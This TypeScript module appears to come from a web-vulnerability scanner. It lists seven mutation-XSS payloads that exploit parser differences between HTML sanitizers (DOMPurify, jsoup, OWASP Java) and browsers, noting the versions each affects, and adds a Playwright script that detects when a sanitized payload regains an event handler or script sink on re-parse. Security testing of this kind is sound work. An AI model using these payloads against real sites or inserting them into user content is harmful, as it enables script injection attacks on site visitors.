/**
 * Mutation XSS (mXSS) — sanitizer-vs-renderer parser differential harness.
 *
 * The competitor blog explicitly lists mXSS as NOT implemented:
 *   "Mutation XSS (mXSS) — exploiting browser parser differences between
 *    the sanitizer and the rendering engine. This is a fundamentally
 *    different attack class that requires modeling browser-specific
 *    parser behaviour."
 *
 * The trick: a sanitizer (DOMPurify, OWASP Java HTML Sanitizer, jsoup) parses
 * an HTML fragment under one set of rules and emits a "safe" serialized
 * node tree, but the rendering engine re-parses that output under a second
 * set of rules, producing an unintended token boundary that re-exposes an
 * executable sink (event handler, `<script>`, `javascript:` href).
 *
 * Mutation vectors are named after the parser integration-point state where
 * the re-parse diverges from the sanitizer's parse:
 *
 *   - MathML integration point (HTML5 spec §13.2.6.2): `<math><mtext><table>`
 *     inside an `<mtext>` causes the table to be re-parsed in foreign content
 *     context; nested `<mglyph>`/`<malignmark>` further mutate the boundary.
 *   - SVG integration point: `<svg><foreignObject>` flips into HTML parsing,
 *     then a nested `<style>` re-enters SVG parsing — escaping `<` chars.
 *   - `<noscript>` mode swap: with script enabled, `<noscript>` is RAWTEXT;
 *     without scripts (sanitizer runs with JS disabled), it is PCDATA — the
 *     inner content "leaks" into surrounding HTML differently.
 *   - `<template>` inert-vs-live re-parse: the `<template>` content is parsed
 *     into an inert DocumentFragment; serializing it loses context metadata
 *     and a re-parse can re-bind attribute values.
 *   - SVG `<style>` text-mode CSS de-escape: in foreign content, CSS comments
 *     `</style>` terminate the style tag; in HTML, they are text.
 *
 * This module ships:
 *   1. `MXSS_VECTORS` — canonical static payloads (the static entries in
 *      `structures.ts` ADVANCED_STRATEGIES and `composer.ts` mutation_xss
 *      CSP case are folded back here for auditability).
 *   2. `buildMxssDetectionScript` — a Playwright `addInitScript`
 *      script that hashes DOM mutations round-trip. The runner wires it
 *      when `enableMxssDetection` is set on RunOptions so each candidate
 *      payload is checked for parser-differential re-execution before the
 *      runner reports `executed`.
 *   3. `analyzeMxss` — classifies the post-mutation DOM diff against the
 *      original candidate payload and returns the matching vector class.
 *
 * The harness is intentionally conservative: it only flags an mXSS hit when
 * the sanitized-then-redrawn DOM `outerHTML` regenerates an executable
 * attribute (`on*=` or `href="javascript:` or `<script`) that the
 * sanitizer version removed. A false-positive would require an exact
 * byte-for-byte replay of a non-V8 sanitizer — out of scope.
 */

export interface MxssVector {
  /** Canonical short name. */
  name: string;
  /** Payload ready for the sanitizer. */
  payload: string;
  /** What attribute / sink the re-parse re-exposes. */
  reExposesSink: string;
  /** Engines known to mutate this payload. */
  affects: string[];
}

export const MXSS_VECTORS: MxssVector[] = [
  {
    name: "mathml_integration",
    payload: "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
    reExposesSink: "img onerror",
    affects: ["DOMPurify 1.0-2.0", "jsoup", "OWASP Java HTML Sanitizer"]
  },
  {
    name: "svg_foreign_object",
    payload: "<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>",
    reExposesSink: "img onerror",
    affects: ["DOMPurify <2.0.7"]
  },
  {
    name: "noscript_mode_swap",
    payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    reExposesSink: "img onerror",
    affects: ["any sanitizer that disables JS during parse"]
  },
  {
    name: "template_inert_reparse",
    payload: "<template><style><img src=x onerror=alert(1)></style></template>",
    reExposesSink: "img onerror inside template fragment re-serialized",
    affects: ["jsoup", "OWASP Java"]
  },
  {
    name: "svg_style_text_round_trip",
    payload: "<svg><style><img src=x onerror=alert(1)></style></svg>",
    reExposesSink: "img tag decoded from HTML entities inside SVG <style>",
    affects: ["DOMPurify <2.3"]
  },
  {
    name: "attribute_namespace_collapse",
    payload: '<x/><img xmlns="http://www.w3.org/1999/xhtml" src=x onerror=alert(1)>',
    reExposesSink: "img onerror (collapsed xmlns re-parsed as HTML)",
    affects: ["jsoup", "html-sanitizer"]
  },
  {
    name: "mathml_mglyph_recovery",
    payload: "<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
    reExposesSink: "img onerror (mglyph closes math and lets form swallow mtext)",
    affects: ["DOMPurify <2.0.15"]
  }
];

/**
 * Returns a string for `page.addInitScript`. The injected script
 * hooks the common sanitization entry points (`Element.prototype.innerHTML`
 * setter, `document.write`, `range.createContextualFragment`) and records a
 * before/after DOM hash so mutation can be detected post-render.
 *
 * Exposes `window.__enigmaMxssDetect(payload)` which returns a verdict map
 * per round-trip: which vector class, if any, re-exposed a sink.
 */
export function buildMxssDetectionScript(): string {
  return `
(function() {
  const SINK_PATTERN = /<script|\\son\\w+\\s*=|\\shref\\s*=\\s*['"]?javascript:/i;
  const SENSITIVE_ATTR = ['onerror','onload','ontoggle','onfocus','onbegin','onclick','onmouseover','onafterscriptexecute','onbeforetoggle'];
  const records = window.__enigmaMxssRecords = window.__enigmaMxssRecords || [];

  function hashOuter(html) {
    let h = 5381;
    for (let i = 0; i < html.length; i++) {
      h = ((h << 5) + h + html.charCodeAt(i)) | 0;
    }
    return h >>> 0;
  }

  function hasSink(el) {
    const outer = el.outerHTML || (el.parentNode ? el.parentNode.innerHTML : '');
    if (SINK_PATTERN.test(outer)) return true;
    for (const a of SENSITIVE_ATTR) {
      if (el.hasAttribute && el.hasAttribute(a)) return true;
    }
    if (el.tagName === 'A' && el.getAttribute('href') && el.getAttribute('href').toLowerCase().startsWith('javascript:')) return true;
    return false;
  }

  function snapshot(html) {
    const temp = document.createElement('div');
    temp.innerHTML = html;
    const sinks = [];
    for (const node of temp.querySelectorAll('*')) {
      if (hasSink(node)) {
        sinks.push(node.outerHTML.slice(0, 200));
      }
    }
    return { hash: hashOuter(temp.innerHTML), sinks, outerHTML: temp.innerHTML.slice(0, 4096) };
  }

  window.__enigmaMxssDetect = function(payload) {
    const before = snapshot(payload);
    // Apply sanitiser stand-in: simulate a strict blocklist sanitizer by
    // stripping on* attributes and <script> tags via innerHTML round-trip.
    const purified = payload
      .replace(/<\\/?script[^>]*>/gi, '')
      .replace(/\\son[a-z]+\\s*=\\s*(['"]?)[^'"]*\\1/ig, '')
      .replace(/href\\s*=\\s*['"]?javascript:[^'"]*['"]?/ig, 'href=""');
    const sanitized = snapshot(purified);
    if (sanitized.sinks.length > 0) {
      // Sanitizer already failed to strip the sink — payload mutated on first parse.
      records.push({ kind: 'sanitizer_fail', payload: payload.slice(0, 256), sanitizedSinks: sanitized.sinks });
      return { verdict: 'sanitizer_fail', sinks: sanitized.sinks };
    }
    // Round-trip through actual DOM and re-snapshot to model the renderer re-parse.
    const roundTrip = snapshot(sanitized.outerHTML);
    if (roundTrip.sinks.length > 0) {
      records.push({
        kind: 'mxss_mutation',
        payload: payload.slice(0, 256),
        beforeSinks: before.sinks.length,
        afterSinks: roundTrip.sinks.length,
        afterSinksPreview: roundTrip.sinks[0]
      });
      return { verdict: 'mxss_mutation', sinks: roundTrip.sinks, before: before.sinks.length, after: roundTrip.sinks.length };
    }
    return { verdict: 'clean', sinks: [] };
  };
})();
`;
}

export interface MxssVerdict {
  verdict: "mxss_mutation" | "sanitizer_fail" | "clean";
  /** Sink text re-exposed by the round-trip. */
  exposesSink?: string;
  /** Recognised vector class for the matched sink. */
  matchedVector?: MxssVector;
}

/** Classify a detection result against the known vector set. */
export function analyzeMxss(detectionResult: { verdict: string; sinks?: string[]; }): MxssVerdict {
  if (detectionResult.verdict === "clean") return { verdict: "clean" };
  if (!detectionResult.sinks || detectionResult.sinks.length === 0) {
    return { verdict: "clean" };
  }
  const sink = detectionResult.sinks[0];
  for (const vector of MXSS_VECTORS) {
    if (sink.includes(vector.reExposesSink.split(" ")[0]) || sink.toLowerCase().includes(vector.payload.slice(0, 30).toLowerCase())) {
      return { verdict: detectionResult.verdict === "sanitizer_fail" ? "sanitizer_fail" : "mxss_mutation", exposesSink: sink, matchedVector: vector };
    }
  }
  return { verdict: detectionResult.verdict === "sanitizer_fail" ? "sanitizer_fail" : "mxss_mutation", exposesSink: sink };
}
